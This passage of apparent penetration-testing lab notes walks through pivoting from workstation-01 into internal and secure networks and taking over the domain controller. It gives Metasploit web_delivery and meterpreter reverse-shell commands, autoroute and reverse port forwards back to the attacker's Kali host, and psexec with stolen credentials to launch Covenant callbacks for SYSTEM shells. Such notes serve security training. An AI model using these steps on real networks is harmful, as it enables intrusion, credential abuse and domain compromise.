3: reverse listener2 / ConnectAddress=workstation-01(secure) / port=2223 / binport=8082
# Secure - its used to get domain access through workstation-01 portfwd

# Create a powershell launcher \for each of the listeners
```

**msfconsole**:
```powershell
use exploit/multi/script/web_delivery
set target 2 = \for powershell
set payload windows/x64/meterpreter/reverse_tcp
set lhost, lport
exploit -j
# copy the payload and run in workstation-01

ipconfig
```

> Here we can see, that we need to setup 2 routes. 
Cause there is 2 more networks besides the external one.

> external - internal - secure


**meterpreter session**:
```powershell
run autoroute -s <internal network ip = 192.168.16.0/24>
run autoroute -s <secure network ip = 10.120.116.0/24>

portfwd add -R -p 2222 -l 443 -L <kali ip>
portfwd add -R -p 2223 -l 8082 -L <kali ip>
portfwd # to show the port forwards actives
# backgroud the session
```

use exploit/windows/smb/psexec
```powershell
set smbdomain, smbuser, smbpass, payload=windows/x64/exec, rhost
set cmd <Reverse HTTP payload from covenant>
exploit
```

> get a shell back from covenant - workstation-02 System

```powershell
set rhosts <DC IP> = we can get the ip by pinging DC01 from workstation-01
set cmd <reverse listener2 payload from covenant
exploit
```

> get a shell back from covenant - DC01 - System

